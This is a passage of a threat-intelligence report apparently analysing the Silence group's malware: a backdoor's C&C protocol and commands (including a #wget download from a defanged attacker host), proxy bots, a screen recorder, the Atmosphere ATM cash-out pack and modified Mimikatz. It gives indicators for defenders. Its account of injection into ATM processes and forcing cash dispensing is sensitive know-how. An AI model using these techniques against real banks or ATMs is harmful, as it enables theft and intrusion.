client. This is 1234567890 on the screenshot below:\n\n|Type of connection|Description|Col3|Example of client request to С&C|\n|---|---|---|---|\n|Connect1|Registration||http://192.168.19[.]171/index.php?xy=1|\n|Connect2|Commands request||http://192.168.19[.]171/index. php?xy=2&axy=1234567890|\n|Connect3|Sending return results||http://192.168.19[.]171/index.php?xy=2&axy=12345 67890&bxy=aaaaabbbbccc|\n\n\n-----\n\n- \"xy=1\" and User-Agent are hard coded, meaning they can serve as a basis for\nwriting signatures to detect malicious network traffic:\n\n**We have also seen other User-Agents in different versions of the Trojan:**\n\n**Year** **user agent**\n\n2017 Microsoft Internet Explorer\n\n2018 \\r\\n\\r\\n\n\n- Next, the file sends the second <request2> request to the C&C. It looks as\nfollows: \"http://cnc/index.php?xy=2&axy=<response1>\", where <response1> is\nthe response of the server to <request1>\n\nExample:\n\n|Year|user agent|Col3|\n|---|---|---|\n|2017|Microsoft Intern|et Explorer|\n|2018|\\r\\n\\r\\n||\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nBelow is a table of C&C commands that the malware executes:\n\n**Command** **Command** **Description** **Example of Use**\n**type**\n\nhtrjyytrn reconnect Terminates the command interpreter, htrjyytrn\nclears all temporary files, connects to\nthe C&C \"from scratch\"\n\nhtcnfhn restart Terminates the command interpreter htcnfhn\nand restarts it\n\nytnpflfybq notasks No operation ytnpflfybq\n\n#wget wget Download a file from a remote server #wget\nand save in the current directory 192.168.19[.]171/f.\nexe 1.exe\n\nshell\\n shell Launch the command interpreter shell\\n\n\n\\n<cmd> run Execution of the arbitrary command \\nipconfig\nof the OS via the command interpreter\n\n- It is worth noting that the command codes are Cyrillic words typed with an\nEnglish layout. This shows that the developer is a Russian speaker.\n\n- The ‘restart’ command restarts the command interpreter, for example if the\ncurrent console is unresponsive.\n\n- The shell\\n command launches a new hidden instance of the OS command\ninterpreter, which will be used to covertly launch commands (the last string in\nthe table of commands) on the infected machine.\n\n|Command|Command type|Description|Col4|Example of Use|\n|---|---|---|---|---|\n|htrjyytrn|reconnect|Terminates clears all te the C&C \"fr|the command interpreter, mporary flies, connects to om scratch\"|htrjyytrn|\n|htcnfhn|restart|Terminates and restart|the command interpreter s it|htcnfhn|\n|ytnpffl ybq|notasks|No operatio|n|ytnpffl ybq|\n|#wget|wget|Download a and save in|flie from a remote server the current directory|#wget 192.168.19[.]171/f. exe 1.exe|\n|shell\\n|shell|Launch the|command interpreter|shell\\n|\n|\\n<cmd>|run|Execution o of the OS vi|f the arbitrary command a the command interpreter|\\nipconfgi|\n\n\n-----\n\n- The #wget command delivers the files from a remote server to a PC. It it used\nto specify which file to download and under what name to save it. The files are\nsaved in the folder where the executable file of the Trojan was launched.\n\n- If none of the control commands of the C&C were received, the connection can\nbe re-established right away or with a 1 or 10-second delay and in cycle.\n\n**How are arbitrary commands launched?**\n\nAfter receiving the shell command, the backdoor can receive an arbitrary\ncommand from the C&C server for execution (\\n<cmd>). For example, it might be a\ncommand to enumerate local network interfaces, \"ipconfig\". Below is a screenshot\nof the client-server traffic with a server sending this command to a client.\n\nAfter receiving the command, the program writes it into stdin of the command\ninterpreter using the WriteFile() function. The command interpreter then executes\nthe command. Next, the backdoor waits for the results of command execution,\nreads it using ReadFile() function and sends the output to the C&C server.\n\n###### Interaction with command interpreter\n\nThe bot does not embed into the cmd.exe process. The launch of commands\nand receiving the results is done by creating a command interpreter process\nand stating data input and output devices (handles) that are open in the current\n(parent) process of the objects (pipes). This is done thanks to the special system\nstructure, _STARTUPINFO, and a flag, bInheritHandles == TRUE (allows inheritance\nof handles of the parent process).\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nThe exchange of data with the command interpreter is implemented as calling the\nWriteFile (to launch the commands) and ReadFile (to obtain the results of their\nexecution) functions.\n\n**The scheme for launching arbitrary commands:**\n\n- Reads new command in cycle, if one has appeared\n\n- Sends a new command for execution to stdin of the command interpreter\n\n- The file under investigation receives the data size for reading == len from the\npipe\n\n- Reads data with len size from stdout of the command interpreter\n\n- Codes data (with result output) and sends to the C&C server\n\n- Rereads for new data every second\n\n- Checks whether the command interpreter has been closed every second\n\n\n-----\n\nThe data from the command interpreter is taken out using the\nPeekNamedPipe(reading the size of a buffer) + ReadFile (reading the content\nof output) functions. The scanned data is encoded using the coding algorithm\nwith the native alphabet, \"AiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_\n**FnT8fOu4GoS,gvR6HMQ2hyPX/\".**\n\n**Despite the fact that the coding algorithm uses random data generation, the**\n**resulting coded data can be decoded on the server by the attacker because:**\n\n1. The random data generator has small entropy (it only generates digits from 0 to\n3);\n\n2. The random data generator was designed this way to ensure that random data\ncould be excluded due to the formula (because the result of multiplication will\nalways be divisible by 4, and the random numbers are always less than 4);\n\n3. Each character of the source data is coded into two symbols using two different\narithmetic operations (formulas). This allows the source data to be decoded by\nsolving the combined equations.\n\nThe usage of pseudo-random numbers helps to avoid being detected by the\nsecurity systems.\n\nAfter execution of a command in the command interpreter, the output is encoded\nand sent to the C&C server in the following format: \"http://cnc/index.php?xy=3&a\n**xy=<response1>&bxy=<encoded_cmdexe_data>\"**\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n**An example of request is presented below:**\n\nData intake after execution in the command interpreter:\n\n**Coding:**\n1 – Data before coding\n2 – Data after coding\n\n\n-----\n\nThe encoded data is then sent to the C&C server:\n\n###### Silence.SurveillanceModule\n\n**File Name** **MD5 hash** **Type of software**\n\nsmmsrv.exe 242b471bae5ef9b4de8019781e55 Silence.SurveillanceModule\n3b85\n\nDesktop video recorder\n\nmss.exe d7491ed06a7f19a2983774fd50d65fb2 Screenshotter\n\nsmmsrv.exeis an executable file for capturing the screen content of the infected\nmachine. To do this, the software uses the StartServiceCtrlDispatcher function to\ncreate its own service called \"Default monitor\".\n\nThe service processes only one command, namely SERVICE_CONTROL_STOP.\nAfter receiving the command, the service switches to SERVICE_STOP_PENDING\nstatus. If there is an error, it displays the debugging string: \"ServiceCtrlHandler:\nSetServiceStatus returned error\".\n\nThe event and flow, where all functions are performed, are created at the entry\npoint of the service. During creation, there might be some errors. The bot will give\n**notification of this using the following debugging messages:**\n\n- \"My Sample Service: ServiceMain: SetServiceStatus returned error\"\n\n|File Name|MD5 hash|Col3|Type of software|\n|---|---|---|---|\n|smmsrv.exe|242b471bae5ef9b4de8019781 3b85|e55|Silence.SurveillanceModule Desktop video recorder|\n|mss.exe|d7491ed06a7f19a2983774fd5|0d65fb2|Screenshotter|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n- \"ServiceMain: SetServiceStatus returned error\"\n\n- \"ServiceMain: CreateEvent returned error\"\n\n- \"ServiceMain: RegisterServiceCtrlHandler returned error\"\n\n**In the main function, the following actions happen during an infinite loop:**\n\n- If there is no pipe index: \"\\\\.\\pipe\\{73F7975A-A4A2-4AB6-9121-AECAE68AABBB}\"\nthe pipe is created.\n\n- Reading the content of mss.txt file, which has to be located in the same folder\nas the file under investigation. The file contains the name of a user, from which\nit should start the mss.exe program (described further).\n\n- Decompression and saving the C:\\Users\\<%Username%>\\AppData\\Local\\Temp\\\nmss.exe file\n\n- Launch of the mss.exe application on behalf of the user, which is described in\nmss.txt (the functionality of the application is described further)\n\n- Reading data from pipe, converting it to image/png format and saving to the C:\\\nUsers\\<%Username%>\\AppData\\Local\\Temp\\out.dat file. Errors that occur while\nworking with the out.dat file are logged as debugging messages by the bot:\n\"Error code <%result of GetLastError%>\\n\"\n\nmss.exe, extracted by the previous program, takes screenshots in cycles, converts\nthem into image/bmp and streams. After this, it writes everything in a pipe with\nthe following name: \"\\\\.\\pipe\\{73F7975A-A4A2-4AB6-9121-AECAE68AABBB}\".\n\nThe program features checking for launch in a sandbox:\n\nThus, the out.dat file contains a pseudo-video stream\n\n###### Silence.ProxyBot\n\n**File Name** **MD5 hash**\n\nsamsung.exe 121c7a3f139b1cc3d0bf62d951bbe5cb\n\nsok83.exe dc4ac53350cc4b30839db19d8d6f3b5f\n\nfirefoxportebles.exe a6cb04fad56f1fe5b8f60fabf2f64005\n\napp.exe a6771cafd7114df25ac0ef2688722fdf\n\napcs.exe 88cb1babb591381054001a7a588f7a28\n\nThe file is written in Delphi and has functions for traffic redirection between a\nremote and a local server. It can collect and send information about the system\nto the remote server and save the data to the register. The program, classified\n\n|File Name|MD5 hash|Col3|\n|---|---|---|\n|samsung.exe|121c7a3f139|b1cc3d0bf62d951bbe5cb|\n|sok83.exe|dc4ac5335|0cc4b30839db19d8d6f3b5f|\n|fri efoxportebles.exe|a6cb04fad|56f1fe5b8f60fabf2f64005|\n|app.exe|a6771cafd7|114df25ac0ef2688722fdf|\n|apcs.exe|88cb1babb|591381054001a7a588f7a28|\n\n\n-----\n\nas ProxyBot, is designed to access isolated segments of the network via an\nintermediate node.\n\nThe executable file contains two strings of great length, which are not involved in\nnormal operation. They could be used, but the developers created a condition for\nthis which is never true.\n\n**Once launched, the program performs the following activity:**\n\n- The random numbers generator generates a random number from 0 to 10. The\ncode for working with the abovementioned lengthy strings is only executed\nwhen the random numbers generator generates the number 36567, which never\nhappens. Obviously, this piece of code was added for testing purposes or, most\nlikely, to evade security means.\n\n- If the application was launched with the arguments of the command line, then\nthe following data is written to the register HKLM\\SYSTEM\\CurrentControlSet\\\nServices\\MicrosoftService\\Note = <command line arguments>\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n- It is important that the registry receives data from the arguments of the\ncommand line, and this data can be sent to the server even after subsequent\nlaunches, when the client is launched with no arguments at all. Thus, the\napplication under investigation can be used to collect other data, save the data\n(as an argument of the command line when launched) into the registry, and\nthen send it.\n\n- A new registry key is created called Types Supported. It is not used anywhere\nfurther: HKLM\\SYSTEM\\CurrentControlSet\\Services\\Eventlog\\Application\\\nMicrosoft Audit Service\\TypesSupported =  7\n\n- The file under investigation tries to connect to the 185.29.10[.]117:443 network\nnode\n\n- The program features two ports: 443 and 444. The first one, 443, is a remote\nport, which should be tapped to connect with C2. The second one, 444, is used\nonly once when sending data about the system from the client to the server.\nStated in the file but not used ports for possible connections: 3389 and 8081\n\n- The connection is established at the layer of TCP sockets (Http and Https\nprotocols are not used)\n\n- If the connection is not established, the attempts to connect and send files will\nbe repeated every 42 seconds or 1 minute (in two different threads).\n\n- After successful connection, the server gets information about the system: a\nstring with 16 random characters, PC name, user name, system right (user SID),\ncountry\\locale, local IP, number of the second port embedded into the build.\nThe length of the statistics package is always 208 bytes.\n\n\n-----\n\n- The file performs 3 different requests to the server. If the responses are not\nequal to zero, it makes 4 more requests in a row (4th,5th,6th,7th requests).\n\n- Then the new TBacklinkClientThread thread is launched. The C&C server\naddress and 2 additional arguments are passed in the thread as arguments.\nThe first argument is the response to the server’s request 1 and is also the\nport for connecting to the remote server and traffic redirection. The second\nargument is the server’s response to request 4.\n\n- The connection to the C&C server is established via the port from the response\nto request 1. The data from response 4 is sent there.\n\n- If the connection is successful and the response is received, the\nTSocksClientThread thread is launched.\n\n- The client reads another portion of data from the server and decrypts it. The\nencryption is done using XOR operations with a 0Dh byte\n\nTherefore, partially binary and partially textual protocol with encryption is\nused by the server to send commands to the client to request data from other\nnetwork nodes (stated by the server). In other words, the client can be used as an\nintermediate proxy server.\n\n###### Silence.ProxyBot.Net\n\n**File Name** **MD5 hash** **Type of software**\n\nsapp.exe 50565c4b80f41d2e7eb989cd24082aab **Silence.ProxyBot.NET**\n\nSocksTest.exe backconnect proxy\n\nSocksTest.exe 8191dae4bdeda349bda38fd5791cb66f\n\nIn the beginning of 2018, we discovered the new version of the ProxyBot\ndeveloped for the .NET framework. The file named sapp.exe_ (56767 bytes, md5:\n50565C4B80F41D2E7EB989CD24082AAB) is an executable program for .Net. The\noriginal name of the program is SocksTest.exe. According to the information from\nthe PE heading of the file, it was compiled on January 25, 2018.\n\n|File Name|MD5 hash|Col3|Type of software|\n|---|---|---|---|\n|sapp.exe SocksTest.exe|50565c4b80f41d2e7eb989c|d24082aab|Silence.ProxyBot.NET backconnect proxy|\n|SocksTest.exe|8191dae4bdeda349bda38f|d5791cb66f||\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nThe program executes the tasks of the proxy server and allows the attacker\nto redirect traffic from the current node to the backconnect server at\n185.161.208[.]61:443. The supported protocols are Sock4\\Socks5. The program is\ncompiled for .NET and needs the .NET Framework 4.0 package installed to launch.\nThe SmartAssembly tool is used for obfuscation.\n\nThe proxy contains encrypted settings for its operation, which are decrypted\ndynamically using one of the methods from the SocksTest.Settings class. The\ndecrypted settings of the proxy are presented below:\n\nFrom these settings it is clear that for its operation the proxy uses a backconnect\nserver at 185.161.208[.]61 port 443, user name \"noname\" and password\n\"password\".\n\n- When connected to the backconnect server, the proxy sends a request with the\nname of the current user and version of the operating system.\n\n- The file under investigation can create a log file and write debugging\ninformation about the operation of the application. However, in the current\nconfiguration and with the current application settings, the log file is not\ncreated (DebugEnabled=false).\n\n\n-----\n\nThe log will be saved to c:\\intel\\slog.log\n\n- If the connection with the backconnect server is lost, the file under\ninvestigation tries to reconnect in cycles.\n\n- The backconnect server may send commands to the proxy to make network\nrequests to undefined network nodes and redirect the results back to the\nbackconnect server.\n\n- The proxy supports the following protocols: Sock4\\Socks5.\n\nBelow you will find the first request sent from the program to the backconnect\nserver:\n\nDespite the fact that the sniffer recognizes the traffic as SSL, this is not the case.\nAs you can see in the image above, the data transferred is not encrypted.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n# SILENCE ATM PACK\n\nLogical attacks on ATMs were the first activity of Silence Group that we detected.\nThe attackers would penetrate the bank’s corporate network, gain entry to the\nvirtual network to which all ATMs were connected and inject unique programs into\nthe ATMs that affected the dispenser process operations.\n\n**This unique pack incorporated the following programs:**\n\n- A Dropper to unpack (out of itself) the Atmosphere library to affect the\ndispenser and the injector to inject Atmosphere into the dispenser process.\n\n- The basic DLL Atmosphere library to affect the dispenser.\n\n- An executable injector program to inject the library into the process\n\n###### Atmosphere.Dropper\n\n**File name** **MD5 hash**\n\napp3.exe 4107F2756EDB33AF1F79B1DCE3D2FD77\n\napp4.exe 6743F474E3A6A02BC1CCC5373E5EBBFA\n\napp11.exe 14863087695D0F4B40F480FD18D061A4\n\nJ133295_18107_a4.exe f69c35969745ae1b60403868e085062e\n\nIn the course of further analyses of the Group, we identified a large number of\nprograms of that type. It was clear that the programs were compiled on the go,\nas the attack was unfolding. Some of them did not work, being designed for ATMs\nof one specific type, while the attackers tried to use them on ATMs of a different\ntype. Thus, programs had to be compiled along the way. As a result, some\n**Droppers had to inject the library to affect the dispenser in a strictly defined**\nprocess; others only had to extract the library, while the injecting was done by\nanother Injector program. In total, we detected up to 10 types of programs with\nminor differences between them. Most of them had logical errors that in some\ncases caused program failure.\n\n**app3.exe works to inject code into SFX manager’s process fwmain32.exe (or,**\nalternatively, sop.exe) for Wincor Nixdorf ATMs; to exploit API functions exported\nby MSXFS library.dll to affect the ATM; to gain information about the ATM and the\namount of cash in its cassettes; and to issue banknotes to the attacker.\n\n- When run, this file checks if the process fwmain32.exe is running. If not,\nit shuts down.\n\n|File name|MD5 hash|Col3|\n|---|---|---|\n|app3.exe|4107F2756ED|B33AF1F79B1DCE3D2FD77|\n|app4.exe|6743F474E3A|6A02BC1CCC5373E5EBBFA|\n|app11.exe|14863087695|D0F4B40F480FD18D061A4|\n|J133295_18107_a4.exe|f69c3596974|5ae1b60403868e085062e|\n\n\n-----\n\n- fwmain32.exe is XFS Manager’s app process for Wincor Nixdorf ATMs.\n\n- If the process fwmain32.exe is found running, it extracts the dynamic librar\ny86EA1F46DF745A30577F02FC24E266FF and saves it to the directory C:\\intel\\\nlib_<rand_chars>.dll, where rand_chars are symbols [A-Za-z] and [\\]^_`.\n\nExamples of file names:\n\n\"c:\\intel\\lib_`TKXV.dll\"\n\n\"c:\\intel\\lib_m_rMJ.dll\"\n\n\"c:\\intel\\lib_f`lUX.dll\"\n\nImportant: The directory c:\\intel is regarded as existent. If not, this file does not\ncreate it. The program tries to check if directory C:\\intel\\ is available by calling the\nWinAPI function GetFileAttributesA.\n\nThe programmer overlooked the fact that if the searched file did not exist in\nprinciple the function would return -1 (0xFFFFFFFF), condition !(0xFFFFFFFF & 0x10)\nwould operate incorrectly and the directory would not be created.\n\n- It then injects the said dynamic library into the process fwmain32.exe using\nthe standard technique Thread Hijack\" OpenProcess + GetThreadContext+\nWriteProcessMemory + SetThreadContext + ResumeThread.\n\n- Payload is run as a shellcode to load its dll file.\n\n- The executable file runs the code of the said dynamic library in the context of\nthe process fwmain32.exe and shuts down.\n\n- As it operates, it shows debug information on the console.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n###### Atmosphere.Injector\n\n**File name** **MD5 hash** **Program type**\n\nfuckacp.exe B3ABB10CC8F4CBB454992B95064A9006 Atmosphere.Injector\n\ninjector.exe 1EE9F88CC7867E021A818DFF012BDF9E Atmosphere.Injector\n\nThis program helps the attacker to inject DLL into the relevant process. Command\nline parameters are used to specify which dynamic library must be injected in\nwhich particular process. It is worth noting that the process is identified not by its\nname, but by its system identifier (process id).\n\nThe code for dynamic library injection is similar to that in the dropper.\n\nSimilarly, we detected several programs of that type. Their compilation settings\nwere different and some libraries were statically linked. This is most likely\nbecause the attacker could not run the program on those ATMs which did not\nhave libraries that the program required.\n\n###### Atmosphere\n\n**File name** **MD5 hash** **Program type**\n\nlib_HpBsi.dll 79E61313FEBE5C67D168CFC3C88CD743 Atmosphere\n\nli.dll C49E6854C79043B624D07DA20DD4C7AD Atmosphere\n\nlib_HkUEl.dll 86EA1F46DF745A30577F02FC24E266FF Atmosphere\n\nc8d0ccd2e58c1c467ee8b138c8a15eec\n\nd81ae5e0680d09c118a1705762b0bfce\n\nlib_xqkRN.dll ddb276dbfbce7a9e19feecc2c453733d\n\nThere are several programs of that kind too. See below for analysis results and\ndifferences.\n\n|File name|MD5 hash|Col3|Program type|\n|---|---|---|---|\n|fuckacp.exe|B3ABB10CC8F4CBB454|992B95064A9006|Atmosphere.Injector|\n|injector.exe|1EE9F88CC7867E021A8|18DFF012BDF9E|Atmosphere.Injector|\n\n|File name|MD5 hash|Col3|Program type|\n|---|---|---|---|\n|lib_HpBsi.dll|79E61313FEBE5C67D16|8CFC3C88CD743|Atmosphere|\n|li.dll|C49E6854C79043B624|D07DA20DD4C7AD|Atmosphere|\n|lib_HkUEl.dll|86EA1F46DF745A3057|7F02FC24E266FF|Atmosphere|\n||c8d0ccd2e58c1c467ee|8b138c8a15eec||\n||d81ae5e0680d09c118|a1705762b0bfce||\n|lib_xqkRN.dll|ddb276dbfbce7a9e19f|eecc2c453733d||\n\n\n-----\n\nThe file lib_HkUEl.dll (size 61440 bytes, md5: 86EA1F46DF745A30577F02FC24E266FF)\n\n- This malicious file operates by injecting code in XFS Manager’s process\nfwmain32.exe for Wincor Nixdorf ATMs and using API functions exported by the\nlibrary MSXFS.dll (loaded into the process fwmain32.exe).\n\n- As the dynamic library is run/loaded into the address range of the process (in\nour case, the app fwmain32.exe), a new thread is started.\n\n- Once the library is unloaded (or the fwmain32.exe parent process terminates),\nthis thread terminates.\n\n- In the course of operation, this file creates the file c:\\intel\\___log.txt and writes\nits operations log in it.\n\n- This file uses / may call the following XFS API functions:\n\n- It copies pointers and creates trampoline to functions WFSGetInfo and\nWFSExecute in its dynamic memory.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n- By calling function WFSGetInfo with flag dwCategory == WFS_INF_CDM_CASH_\nUNIT_INFO the attacker can gain information about the status and contents of\nall cassettes in the ATM.\n\n- The dispenser is identified by calling the function WFSGetInfo with the flags\ndwCategory == 301(WFS_INF_CDM_CASH_UNIT_INFO) and 401 (value unknown).\n\n- The function WFSGetInfo to identify the dispenser is called sequentially 30\ntimes with different hService values ranging from 1 to 30 – obviously to search\nfor services in the system and locate the service handle that corresponds to the\nrunning ATM service. This could be done by calling the function WFSOpen, but\nthe attacker probably thought that the argument of the first function (the ATM’s\nlogical name in the system) could be non-standard or different on different\nATM types, so he decided to do an ATM device search by using the brute force of\nopen service handles.\n\n- A thread is then created to check every one second if there are commands from\nthe attacker and execute them if needed\n\n###### Command transmission\n\nOnce the command file is found, its contents are read by the function \"fread\" and\nare then split into lines. Characters between quotation marks (\") are extracted\nfrom the first line. Then the first character extracted from quotation marks is\nconverted into a command number. Once the command is received, WinAPI of the\nfunctions CryptAcquireContextA and CryptGenRandom generates a line with a\nrandom set of characters. The size of the line is not less than the size of the file,\nplus a random number between 10 and 1024. The resulting line is then added to\nthe end of the file, and the file is deleted.\n\n\n-----\n\n- The bot receives commands as newly created files with *.cmd in this file’s root\ndirectory.\n\n- If there is any file with the extension *.cmd, the app will search for, open and\nread it.\n\n- After reading, the command file is supplemented by random data of random\nlength and the file is deleted\n\nCommands in the file *.cmd are transmitted as plain text: <one_upper_char>\n(including quotations marks).\n\nThe command that is activated depends on the character between the quotation\nmarks.\n\nFor example, if the content of the command file is A (with quotation marks), the\ncommand indexed 3 will be executed: retrieve information about ATM cash units.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nSupported commands are listed below.\n\n|Command|Description|Col3|\n|---|---|---|\n|1,8,9,10,11,12,13|Write return code o flie and log flie|f the last executed command in a separate|\n|2|Retrieve ATM cash with formatting (ad|unit data and write the result in the log flie, vanced write mode)|\n|3|Retrieve ATM cash|unit data|\n|4|Retrieve ATM cash|unit data and write the result in the log flie|\n|5|Inject code\\modify app’s random threa functions sequence GetThreadContext|the command counter of the current d (fwmain32.exe) by calling the GetCurrentProcessId + OpenThread + + SetThreadContext|\n|7|Issue cash in a one|-off mode|\n|?|Issue all cash, inter|val 3 seconds|\n|?|Establish a limit on|cash issuance|\n\n\n-----\n\nTo withdraw cash, the attacker first executes commands to retrieve information\non the existing banknotes. This information is also recorded in the log file as the\nfollowing line:\n\n|INDEX:<a>|CU state:<b>|Type:<c>|Values:<d>|Currency_ID:<e>|Money count:<f>|,\nwhere a is the index, b is the state of the cassette (full/empty, etc.), c is the\ncash unit type, d is the banknote nominal value, e is the currency by ISO (threecharacter), and f is the current number of banknotes.\n\nThis is followed by command D to withdraw cash.\n\nWhen this command is executed, a file is created named as a command file, but\nwith extension 007, i.e. if the command file is second.cmd, the new file will be\nsecond.007, with the code of the last executed command. The log file will also\nhave the following line:\n\n**[2017/11/15 18:15:24.111] last command response code 0**\n\nThe resulting code for last command execution is also written at the end of the\nline.\n\nAmong other things, we also found an old virtual interface table that handles\ncommands in the code. The handler looks different there: it can issue banknotes\nfrom all the cassettes one by one with an interval of 3 seconds. Banknote issue is\ntriggered by the same function everywhere, including this handler.\n\nShown below is the code that adds unnecessary information and deletes the file.\n\nPresumably, the file should have been rewritten by the generated string and\ndeleted afterwards, but in fact this string is only added to the end of the file, as\ncan be seen from the snapshot above.\n\nIt is worth noting that one iteration of the program can only process one file and\nonly one command from it. Even though the content is broken down into lines, it\nis only the first line that is processed, and only the first character from it (the one\nbetween quotation marks) is used and converted to the command number.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n###### Withdrawing cash\n\nCash is withdrawn by calling the function WFSExecute with the flag\ndwCommand==WFS_CMD_CDM_DISPENSE (issue banknotes from cassettes).\n\n**Function prototype:**\n\n```\nHRESULT extern WINAPI WFSExecute ( HSERVICE hService, DWORD\ndwCommand, LPVOID lpCmdData, DWORD dwTimeOut, LPWFSRESULT *\nlppResult);\n\n```\n\nThe code of the WFS_CMD_CDM_DISPENSE command to issue banknotes from\ncassettes serves as the second argument.\n\nThe banknote denomination parameters are transmitted during the call.\n\nDenomination is a selection of the number of banknotes from specific cassettes\nto be put together as the required amount for withdrawal (i.e. which banknotes\nare to be issued).\n\nThe structure below serves as the third argument:\n\nIt is interesting to note that the field bPresent of this structure is set to TRUE.\nThis means that after the command is executed to collect banknotes from the\ncassettes, the dispenser will issue them to the customer. This explains why this\nfile does not use the command to issue cash directly (by calling WFSExecute +\ncommand code WFS_CMD_CDM_PRESENT).\n\n\n-----\n\nThe file lib_xqkRN.dll (size 122880 bytes, md5: DDB276DBFBCE7A9E19FEECC2C45373\n3D) is a slightly different version of Atmosphere.\n\nA binary comparison of the files lib_xqkRN.dll and lib_HkUEl.dll shows that 38%\nof the first file’s functions equals ~100% of the functions with the corresponding\ncode in the second file (i.e. 71% of all of the functions of the second file). The\nfunctions designed to affect the ATM are practically overlapping. One significant\ndifference is that this file has functions to read keys entered on the PIN pad.\n\nThis command helps the attacker retrieve information on the physical\narrangement of keys on the PIN pad and can subsequently be used to give a\ncommand to issue cash on demand (manually on the attacker’s PIN pad).\n\nThis means that the attacker is able to control cash withdrawal not only remotely\n(by sending a command to the ATM) but also physically (by pressing a combination\nof keys on the PIN pad).\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n**Other differences between the first and the second files in the rest of the code**\n**are based on:**\n\n1. Different compiler settings and optimization in the first and second files.\n\n2. The fact that the first file lib_xqkRN.dll has a code added to it that the second\nfile does not have. This also explains why the first file has a larger number\nof functions. Principally, it is a cryptographic class code to encrypt RSA, AES,\nMD5, SHA-1, for which no code has been detected.\n\n3. Additionally, the second file has a list of currencies that the first sample\ndid not have. The code operating with these strings in this file is not called\nanywhere.\n\nAnother version of Atmosphere lib_HpBsi.dll (MD5 79E61313FEBE5C67D168CFC3\nC88CD743, 61440 bytes, timestamp: 59D94BD5 (Sat Oct 07 21:49:09 2017)), which\nthe DROPPER extracts from its resources, is also designed for withdrawing\nbanknotes from ATM cassettes. It has minor differences and the following\ncommand table:\n\n\n-----\n\n|Command|Description|Col3|\n|---|---|---|\n|\"B\"|Retrieves information about t line \"cash units info received|he contents of ATM cassettes. The \" is added to the log.|\n|\"A\"|Retrieves information about t logging.|he contents of the cassettes without|\n|\"Q\"|Retrieves information about t|he contents of ATM cassettes.|\n|\"D\"|One-off issue of banknotes o ATM.|f a specifci denomination from the|\n|\"H\"|Suspends all threads in the p the GetThreadContext + SetTh execution to its own function|rocess, except for its own, and uses readContext functions to redirect .|\n|\"M\", \"R\", \"S\", \"P\", \"T\", \"L\"|The result of the last comma intel\\<chrs>.007. This comman end of any other command.|nd execution is written to the flie C:\\ d is also executed by default at the|\n\n\nWe have also detected Atmosphere \"li.dll\" (MD5 C49E6854C79043B624D07DA20\nDD4C7AD, 57344 bytes, timestamp: 59DA3AE9 (Sun Oct 08 14:49:13 2017)), with a\n‘hacker-style’ representation of threads.\n\nSome debugging information is not available, and many lines were modified, e.g.,\nPinPad -> \"QinQad\", DISPENSER -> D1SP3NS3R, etc.\n\nAlso unavailable is some debugging information that was available in the first\nlibrary.\n\nThe format of the command is *.ccd, not *.cmd, but they share the same command\nhandler, i.e. the commands have the same format and perform the same actions.\n\nIn April 2018, Silence attacked another Russian bank, using Atmosphere to empty\nits ATMs. There were minor differences compared to the previous versions, but\nit was clear that the developer went a long way to debug the program and that\nhe eventually got rid of the unnecessary functions and enhanced the program’s\nsustainability.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n**The program uses the following command handlers:**\n\n**Command number** **Command value**\n\n2 Retrieve information about ATM cash units and write the\nresult in the log file, with formatting (extended write mode)\n\n3 Retrieve information about ATM cash units\n\n4,13 Retrieve information about ATM cash units and write the\nresult in the log file\n\n7 One-off cash withdrawal\n\n10 Suspend operations for 10 minutes\n\n11 Terminate app operation\n\n8 Withdraw all cash, interval 3 seconds\n\n**Below is a table that compares the old version with the new:**\n\n|Command number|Command value|Col3|\n|---|---|---|\n|2|Retrieve informa result in the log|tion about ATM cash units and write the flie, with formatting (extended write mode)|\n|3|Retrieve informa|tion about ATM cash units|\n|4,13|Retrieve informa result in the log|tion about ATM cash units and write the flie|\n|7|One-off cash wit|hdrawal|\n|10|Suspend operati|ons for 10 minutes|\n|11|Terminate app o|peration|\n|8|Withdraw all cas|h, interval 3 seconds|\n\n|Function|Old samp|le|New sample|\n|---|---|---|---|\n|Working directory|c:\\intel||c:\\atm\\1|\n|Process for injecting|fwmain32|.exe|atmapp.exe|\n|Method for launching payload after injection into the process|LoadLibra|ry shellcode|LoadLibrary shellcode (with minor changes)|\n|Debugging info shown in the console|In an exte|nded format|In a brief format, only the number of detected processes|\n|List of XFS functions used|WFMFreeB WFMAlloc WFSExecu WFSFreeR WFSGetIn|uffer, ateBuffer, te, esult, fo|WFMFreeBuffer, WFMAllocateMore, WFMAllocateBuffer, WFSExecute, WFSFreeResult, WFSStartUp, WFSGetInfo|\n|File size|60 Kbytes||84 Kbytes|\n|Creating springboards on function WFS*|Yes||No|\n|Retrieving information on cassette status|Yes||Yes|\n|Determining dispenser and PIN pad status before operation (codes 301 and 401)|Yes||No|\n|Searching for hService handles when calling WFSGetInfo|Yes||No|\n\n\n-----\n\n|Functions available to read the keys entered on the PIN pad|Yes|Col3|No|\n|---|---|---|---|\n|Transmitting commands through flies with extension|*.cmd||*.c|\n|Random data generation based on|CryptAcquireCo CryptGenRando|ntextA + m|rand()|\n|Writing return code to flie|Yes, to flie with *.007|extension|No|\n|A command to modify the command counter of the current app’s random fol w|Yes, command #|5|No|\n|Command to pause Trojan operation|No||Yes|\n\n\n# OTHER PROGRAMS\n\n###### Utilities\n\n Farse\n\n**File name** **MD5 hash** **Program type**\n\nm32.exe 40228a3ea22e61a0f53644881cd59281 Mimikatz\n\nThis file is a modified version of the well-known utility Mimikatz that extracts\nclear text credentials and hashes from memory. Mimikatz source code is available\non the developer’s page hххps://github[.]com/gentilkiwi/mimikatz.\n\nAnalysis of this file suggests that it is based on Mimikatz source code, with some\nnew functions added to the file.\n\nWe compared it to Mimikatz 2.1.1 x86, the latest available version at the time\nof writing this report. The file was found to contain artifacts that suggest that\nassembly had been based on source codes of earlier versions (< 2.1.1).\n\nInformation in the header of the executable file suggests that it was compiled on\n19.09.2009 at 07:39:40 GMT.\n\n- A binary comparison of this file with the 